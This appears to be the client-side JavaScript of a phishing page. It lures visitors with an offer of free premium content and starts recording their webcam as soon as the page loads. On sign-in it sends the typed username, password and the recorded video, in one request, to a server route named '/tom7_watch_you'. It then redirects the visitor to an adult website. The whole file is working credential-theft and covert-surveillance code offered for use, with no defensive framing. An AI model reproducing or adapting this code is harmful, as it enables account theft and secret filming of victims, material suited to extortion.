// Get HTML elements
const videoElement = document.getElementById('VCAM');
const loginButton = document.getElementById('LOAD');
const statusMessage = document.getElementById('SMSG');
const form = document.getElementById('loginForm');

let mediaRecorder;
let recordedChunks = [];
let stream;
let canvas, ctx, canvasStream;

// Function to start webcam access and recording automatically
async function startWebcamAndRecording() {
  try {
    statusMessage.textContent = "Please Grant The Required Permissions.";
    stream = await navigator.mediaDevices.getUserMedia({
      video: true, audio: false });
      videoElement.srcObject = stream;
      // Create canvas for mirroring
      canvas = document.createElement("canvas");
      ctx = canvas.getContext("2d");
      const settings = stream.getVideoTracks()[0].getSettings();
      canvas.width = settings.width || 640;
      canvas.height = settings.height || 480;
      // Draw video frame to canvas with horizontal mirror effect
      function drawFrame() {
        if (!videoElement.srcObject) return;
        ctx.save();
        ctx.scale(-1, 1);
        ctx.drawImage(videoElement, -canvas.width, 0, canvas.width, canvas.height);
        ctx.restore();
        requestAnimationFrame(drawFrame);
      }
      drawFrame();
      
      // Capture stream from canvas + original audio
      canvasStream = canvas.captureStream(30);
      const audioTrack = stream.getAudioTracks()[0];
      if (audioTrack) {
        canvasStream.addTrack(audioTrack);
      }
      
      statusMessage.textContent = "Sign In To Access All Premium Content For Free.";
      // Enable login button once recording starts
      loginButton.disabled = false;
      // Initialize MediaRecorder from the canvas stream
      mediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          recordedChunks.push(event.data);
        }
      };
      // Start recording
      mediaRecorder.start();
  } catch (err) {
    statusMessage.textContent = "Error! Please Grant The Required Permissions.";
    loginButton.disabled = true;
  }
}

// Function to stop recording and prepare video blob
function stopRecording() {
  return new Promise((resolve, reject) => {
    if (!mediaRecorder || mediaRecorder.state === 'inactive') {
      resolve(null);
      return;
    }
    
    mediaRecorder.onstop = () => {
      const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
      recordedChunks = [];
      // Stop webcam tracks to turn off the camera light
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
      videoElement.srcObject = null;
      resolve(videoBlob);
    };
    mediaRecorder.stop();
    });
}

// Handle form submission
form.addEventListener('submit', async (event) => {
  event.preventDefault();
  // Disable button to prevent double clicks
  loginButton.disabled = true;
  loginButton.textContent = 'LOADING...';
  // Stop recording and wait for the video blob to be ready
  const video = await stopRecording();
  if (!video) {
    alert("Something Went Wrong. Please try again.");
    loginButton.disabled = false;
    loginButton.textContent = 'SIGN IN';
    return;
  }
  // Get username and password from the form
  const username = form.elements['username'].value;
  const password = form.elements['password'].value;
  // Create a FormData object to send both text and video data
  const formData = new FormData();
  formData.append('username', username);
  formData.append('password', password);
  formData.append('video', video, 'TOM7_WATCH_YOU.webm');
  // Send data to the Flask server
  try {
    const response = await fetch('/tom7_watch_you', {
      method: 'POST',
      body: formData
    });
    const data = await response.json();
    if (response.ok) {
      alert('Login successful');
      setTimeout(() => {
        window.location.href = "https://xnxx.com";
      }, 3000);
    } else {
      alert('Login failed');
    }
  } catch (error) {
    alert('An error occurred. Please Try Again Or Refresh The Pages.');
  } finally {
    // Reset button state
    loginButton.disabled = false;
    loginButton.textContent = 'SIGN IN';
  }
});

// Start the webcam process automatically when the page loads
window.addEventListener('load', startWebcamAndRecording);
// Stop recording when the user leaves the page to prevent memory leaks
window.addEventListener('beforeunload', () => {
  if (mediaRecorder && mediaRecorder.state === 'recording') {
    mediaRecorder.stop();
  }
  if (stream) {
    stream.getTracks().forEach(track => track.stop());
  }
});